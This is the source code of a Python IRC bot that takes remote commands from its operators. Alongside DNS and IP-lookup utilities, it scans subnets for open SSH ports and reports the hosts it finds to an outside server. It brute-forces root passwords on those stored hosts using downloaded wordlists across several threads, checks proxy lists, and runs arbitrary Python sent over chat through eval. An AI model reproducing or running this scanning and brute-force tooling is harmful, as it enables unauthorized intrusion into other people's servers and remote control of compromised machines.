# -*- coding: utf-8 -*-

import sys
import socket
import urllib2
import json

from connection import Connection
from threading import Thread

#from lolclean.lolclean import LOLClean
import paramiko

class Bot:
	END_OF_MOTDS = ['376', '422']
	PREFIX = 'v'
	TAG = ''

	OWNERS = ['segfault']

	LOL = False

	USAGE = {
		'power': 'power [nickname] # gives power to {nickname} (admin-only).',
		'gods': 'gods # show who i serve.',
		'nick': 'nick [nickname] # change nickname (admin-only).',
		'join': 'join [channel] # join channel (admin-only).',
		'jobs': 'jobs # show all runnning jobs.',
		'stop': 'stop [jobname|all] # stop all jobs or jobs with {jobname} (admin-only).',
		'silent': 'silent [1|0] # silent execution, 1 equals true, 0 equals false (admin-only).',
		'py': 'py [python_code] # compile a slice of python code and returns it.',
		'dns': 'dns [dns] # show {dns} host.',
		'ip': 'ip [ip] # show {ip} geolocation.',
		'proxy': 'proxy [URL] # check for all proxies in URL (text file with proxies).',
		'ssh': 'ssh [net] # scan for open sshs in net (e.g. 200.100.100).',
		'nssh': 'nssh # show the number of open sshs currently stored.',
		'bsshu': 'bsshu [ssh] [key] # brute force {ssh} with given {key}.',
		'bssh': 'bssh [URL] [keys_per_thread] # brute force stored open sshs with {URL} wordlist and {keys_per_thread}.',
		#'summoner': 'summoner [summoner_name] # show {summoner_name} data.',
		#'rank': 'rank [summoner_name] # show {summoner_name} rank data.',
		#'last': 'last [summoner_name] # show {summoner_name} last game data.',
	}

	HELP = '{0} [{1}]'.format(PREFIX, ', '.join(sorted(USAGE.keys())))

	COLOR_CODE = '\x03'

	COLORS = {
		'white': '0',
		'black': '1',
		'blue': '2',
		'green': '3',
		'red': '4',
		'brown': '5',
		'purple': '6',
		'orange': '7',
		'yellow': '8',
		'lgreen': '9', #light green
		'teal': '10', #green/blue cyan
		'lcyan': '11', #light cyan
		'lblue': '12', #light blue
		'pink': '13',
		'grey': '14',
		'lgrey': '15', #light grey
	}

	def __init__(self, nick):
		self.__connections = []
		self.__buffers = []
		self.__channels = []
		self.__threads = {}
		self.__vnc = {}
		self.__key = 0
		self.__nick = nick
		self.__silent = True
		#self.__lol = LOLClean('1201f800-aced-4abb-9083-714dcf58a36e')

	def add_connection(self, sv, port):
		con = Connection(sv, port)
		self.__connections.append(con)
		self.__buffers.append('')

	def set_channels(self, channels):
		self.__channels = channels

	def connect(self):
		for con in self.__connections:
			if con.active:
				continue
			con.connect(self.__nick)
		self.work()
	
	@property
	def currcon(self):
		return self.__connections[self.__key]

	def printayne(self, msg, targets=None):
		self.currcon.msg(msg, targets)

	def printayne_e(self, msg, targets=None):
		self.currcon.msg('{0}EXCEPTION:{1} {2}'.format(self.color('red', 'black'), self.color('white', 'black'), msg), targets)

	def color(self, fg, bg):
		return '{0}{1},{2}'.format(self.COLOR_CODE, self.COLORS[fg], self.COLORS[bg])

	def parse(self, data):
		print(data)
		source = ''
		line = ''
		if data.startswith(':'):
			source, line = data[1:].split(' ', 1)
		else:
			source = None
			p = data.split(' ')
			if p[0] == 'PING':
				self.currcon.write(('PONG', p[1]))
				print("PONG")
				return

		if ' :' in line:
			argstr, text = line.split(' :', 1)
		else:
			argstr, text = line, ''
		args = argstr.split(' ')

		if args[0] in self.END_OF_MOTDS:
			for channel in self.__channels:
				self.currcon.write(('JOIN', channel))
			return

		if text:
			if (text[0] == self.PREFIX or text.split(' ')[0] == self.__nick) and len(text.split(' ')) >= 2:
				self.parse_cmd(text, source, args[1] if args[1][0] == '#' else source.split('!')[0])

	def check_args(self, args, req, place):
		if len(args) < req:
			self.printayne('?', [place])
			return False
		return True

	def check_owner(self, source, place):
		if source in self.OWNERS:
			return True
		self.printayne('who the fuck are you?', [place])
		return False

	def add_jobs(self, key, jobs):
		if key not in self.__threads:
			self.__threads[key] = []
		for job in jobs:
			self.__threads[key].append(job)

	def pop_job(self, key):
		if len(self.__threads[key]) > 1:
			self.__threads[key].pop()
		else:
			self.__threads.pop(key, None)

	def job_running(self, key):
		if key not in self.__threads:
			return False
		return True

	def lolit(self):
		return LeagueOfLegends(self.RIOT_API_KEY)

	def parse_cmd(self, cmd, source, place):
		args = cmd.split(' ') 
		#pop to remove the prefix
		args.pop(0)

		if len(args) < 1:
			return

		cmd = args.pop(0)
		source = source.split('!')[0]

		color_arg = self.color('lgrey', 'black')
		color_val = self.color('white', 'black')
		color_yval = self.color('yellow', 'black')
		color_error = self.color('red', 'black')

		if (cmd == 'help'):
			if args:
				if args[0] in self.USAGE:
					self.printayne('{0} {1}'.format(self.PREFIX, self.USAGE[args[0]]), [place])
					return
			self.printayne(self.HELP, [place])

		if (cmd == 'power'):
			if not self.check_owner(source, place):
				return
			if not self.check_args(args, 1, place):
				return

			self.OWNERS.append(args[0])
			self.printayne('now {0} has full power'.format(args[0]), place)

		if (cmd == 'gods'):
			self.printayne('i serve to => [{0}]'.format(', '.join(self.OWNERS)), [place])

		if (cmd == 'nick'):
			if not self.check_owner(source, place):
				return
			if not self.check_args(args, 1, place):
				return

			self.__nick = args[0]
			self.currcon.write(('NICK', args[0]))

		if (cmd == 'join'):
			if not self.check_owner(source, place):
				return
			if not self.check_args(args, 1, place):
				return
			self.currcon.write(('JOIN', args[0]))
			self.__channels.append(args[0])

		if (cmd == 'jobs'):
			ct = 0
			jobs = ''
			for k, v in self.__threads.iteritems():
				l = len(v)
				ct += l
				jobs += '{0}[{1}] '.format(k, l)
			self.printayne('currently running {0} jobs => {1}'.format(ct, jobs), [place])

		if (cmd == 'stop'):
			if not self.check_args(args, 1, place):
				return
			if args[0] == 'all':
				self.__threads.clear()
				return
			if args[0] in self.__threads:
				self.__threads.pop(args[0], None)

		if (cmd == 'silent'):
			if not self.check_owner(source, place):
				return
			if not self.check_args(args, 1, place):
				return
			if args[0] == '1':
				self.__silent = True
			elif args[0] == '0':
				self.__silent = False
			self.printayne('silent mode => {0}'.format(self.__silent), [place])

		if (cmd == 'py'):
			if not self.check_owner(source, place):
				return
			if not self.check_args(args, 1, place):
				return
			try:
				ret = eval(' '.join(args))
				self.printayne(ret, [place])
			except Exception as e:
				self.printayne(e, [place])

		if (cmd == 'dns'):
			if not self.check_args(args, 1, place):
				return
			try:
				self.printayne('{0}{1} {2}=>{3} {4}'.format(color_yval, args[0], color_arg, color_val, socket.gethostbyname(args[0])), [place])
			except Exception:
				self.printayne('could not get host by name {0}'.format(args[0]), [place])

		if (cmd == 'ip'):
			if not self.check_args(args, 1, place):
				return
			try:
				web_file = urllib2.urlopen('{0}/{1}'.format('http://ip-api.com/json', args[0]))
				data = json.loads(web_file.read())
				if data['status'] == 'success':
					for i,k in data.items():
						if not k:
							data[i] = '?'
					self.printayne(u"{0} {1} {2}=> local: {3}{4} - {5} - {6}/{7} {8}# timezone: {9}{10} {11}# isp: {12}{13} {14}# as:{15} {16}".format(color_yval, data['query'], color_arg, color_val, data['city'], data['regionName'], data['country'], data['countryCode'], color_arg, color_val, data['timezone'], color_arg, color_val, data['isp'], color_arg, color_val, data['as']), [place])
				else:
					self.printayne('{0} FAILED => {1}'.format(data['query'], data['message']), [place])
			except Exception, e:
				self.printayne(str(e), [place])
				self.printayne('could not open ip api url', [place])

		if (cmd == 'port'):
			if not self.check_args(args, 2, place):
				return
			try:
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.settimeout(3)
				result = sock.connect_ex((args[0], int(args[1])))
				if result == 0:
					self.printayne('{0} {1} {2}port{3} {4} {5}OPEN'.format(color_yval, args[0], color_val, color_yval, args[1], self.color('lgreen', 'black')), [place])
				else:
					self.printayne('{0} {1} {2}port{3} {4} {5}CLOSED'.format(color_yval, args[0], color_val, color_yval, args[1], self.color('red', 'black')), [place])
			except:
				self.printayne('{0}EXCEPTION: {1}invalid arguments'.format(color_error, color_val), [place])

		if (cmd == 'proxy'):
			if not self.check_owner(source, place):
				return
			if not self.check_args(args, 1, place):
				return

			t = Thread(target=self.proxy, args=(args[0], place,))
			self.add_jobs('proxy', [t])
			t.start()
			self.printayne('checking for proxies in {0}'.format(args[0]), [place])

		if (cmd == 'ssh'):
			if not self.check_owner(source, place):
				return
			if not self.check_args(args, 1, place):
				return

			t = Thread(target=self.ssh, args=(args[0], place,))
			self.add_jobs('ssh', [t])
			t.start()
			self.printayne('scanning for ssh in subnet {0}'.format(args[0]), [place])

		if (cmd == 'nssh'):
			try:
				web_file = urllib2.urlopen('http://www.huelol.com/ssh/all')
				sshs = web_file.readlines()
				self.printayne('{0} sshs available to brute force'.format(len(sshs)), [place])
			except Exception, e:
				self.printayne(e, [place])
				self.printayne('error downloading ssh list file', [place])

		if (cmd == 'bsshu'):
			if not self.check_owner(source, place):
				return
			if not self.check_args(args, 2, place):
				return

			ssh_cli = paramiko.SSHClient()
			ssh_cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			if self.bssh_u(ssh_cli, args[0], args[1]):
				self.printayne('ssh {0} key {1} ACCEPTED'.format(args[0], args[1]), [place])
			else:
				self.printayne('ssh {0} key {1} REJECTED'.format(args[0], args[1]), [place])

		if (cmd == 'bssh'):
			if not self.check_owner(source, place):
				return
			if not self.check_args(args, 2, place):
				return

			t = Thread(target=self.bssh, args=(args[0], args[1], place,))
			self.add_jobs('bssh', [t])
			t.start()
			self.printayne('bruteforcing ssh {0}.. {1} keys per thread (5 threads)'.format(args[0], args[1]), [place])

		if (cmd == 'goo'):
			if not self.check_args(args, 1, place):
				return

			rsz = 5
			page = 1
			if len(args) > 1:
				rsz = int(args[1])
			if len(args) > 2:
				page = int(args[2])

			url = 'https://ajax.googleapis.com/ajax/services/search/web?v=1.0&q={0}?id=&rsz={1}&start={2}'.format(args[0], rsz, rsz*(page-1))
			data = urllib2.urlopen(url)
			jdata = json.loads(data.read())
			try:
				for i,v in enumerate(jdata['responseData']['results'][:5]):
					self.printayne('{0}[{1}]{2} {3}'.format(color_yval, i, color_val, urllib2.unquote(v['url'])), [place])
			except Exception, e:
				self.printayne_e('could not get any results', [place]) 

		if not self.LOL:
			return

		if (cmd == 'summoner'):
			if not self.check_args(args, 2, place):
				return

			lol = self.lolit()
			lol.set_api_region(args[1])

			try:
				data = lol.get_summoner_by_name(args[0])
				s_name = data.iterkeys().next()
				s_data = data[s_name]
				s_id = s_data['id']
				s_level = s_data['summonerLevel']
				self.printayne('{0} => id {1} # level {2}'.format(s_name, s_id, s_level), [place])
			except RiotError, e:
				self.printayne('riot error => {0}'.format(e.error_msg), [place])

		if (cmd == 'rank'):
			if not self.check_args(args, 2, place):
				return
			fine, output = self.__lol.rank(args[0], args[1])
			if fine:
				for line in output:
					self.printayne(line, [place])
			else:
				self.printayne(output, [place])

		if (cmd == 'last'):
			if not self.check_args(args, 2, place):
				return
			fine, output = self.__lol.last(args[0], args[1])
			self.printayne(output, [place])

	def is_bad_proxy(self, pip):
		try:
			proxy_handler = urllib2.ProxyHandler({'http': pip})
			opener = urllib2.build_opener(proxy_handler)
			opener.addheaders = [('User-agent', 'Mozilla/5.0')]
			urllib2.install_opener(opener)
			req=urllib2.Request('http://www.google.com')
			sock=urllib2.urlopen(req)
		except urllib2.HTTPError, e:
			return True
		except Exception, detail:
			return True
		return False

	def proxy(self, url, place):
		socket.setdefaulttimeout(5)
		try:
			web_file = urllib2.urlopen(url)
			for p in web_file:
				if not self.job_running('proxy'):
					return
				if not self.is_bad_proxy(p.strip('\n')):
					self.printayne('proxy {0} ONLINE'.format(p), [place])

		except Exception, e:
			self.printayne(e, [place])
			self.printayne('error downloading your proxy list file', [place])
			return

	def ssh_u(self, target):
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.settimeout(3)
			sock.connect((target, 22))
			return True
		except Exception, e:
			return False

	def ssh(self, net, place):
		for i in xrange(1, 256):
			if not self.job_running('ssh'):
				return
			target = '{0}.{1}'.format(net, i)
			if self.ssh_u(target):
				urllib2.urlopen('{0}{1}'.format('http://www.huelol.com/ssh/check/', target))
				self.printayne('ssh {0}'.format(target), [place])
		self.pop_job('ssh')

	def bssh_u(self, ssh_cli, target, key):
		try:
			ssh_cli.connect(target, username='root', password=key)
			return True
		except Exception, e:
			return False

	def bssh_r(self, ssh_cli, target, keys, place):
		for k in keys:
			if not self.job_running('bssh'):
				return
			if not self.__silent:
				self.printayne('brute forcing {0} with key {1}'.format(target, k), [place])
			if self.bssh_u(ssh_cli, target, k.strip('\r\n')):
				self.printayne('ssh {0} KEY {1} ACCEPTED'.format(target, k), [place])
		self.pop_job('bssh')

	def bssh(self, url, kpt, place):
		try:
			web_file = urllib2.urlopen('http://www.huelol.com/ssh/all')
			sshs = web_file.readlines()
			web_file = urllib2.urlopen(url)
			keys = web_file.readlines()
			self.printayne('collected {0} running SSHs # wordlist contains {1} keys'.format(len(sshs), len(keys)), [place])

			ssh_cli = paramiko.SSHClient()
			ssh_cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			for ssh in sshs:
				if not self.job_running('bssh'):
					return
				self.printayne('bssh now bruting {0}'.format(ssh), [place])
				ts = []
				for i in range(5):
					kpt = int(kpt)
					t = Thread(target=self.bssh_r, args=(ssh_cli, ssh.strip('\r\n'), keys[i*kpt:i*kpt+kpt], place,))
					self.add_jobs('bssh', [t])
					t.start()
					ts.append(t)
				for t in ts:
					t.join()
		except Exception, e:
			self.printayne(e, [place])
			self.printayne('error downloading ssh list file', [place])


	def work(self):
		while True:
			for key, con in enumerate(self.__connections):
				self.__buffers[self.__key] += con.socket.recv(1024)
				temp = self.__buffers[self.__key].split('\n')
				self.__buffers[self.__key] = temp.pop()
				
				for line in temp:
					clean = line.rstrip()
					self.__key = key
					self.parse(clean)

if __name__ == '__main__':
	bot = Bot(sys.argv[2])
	#bot.add_connection('google.root-network.org', 6667)
	bot.add_connection(sys.argv[1], 6667)
	channels = ['#{0}'.format(x) for x in sys.argv[3:]]
	bot.set_channels(channels)
	bot.connect()
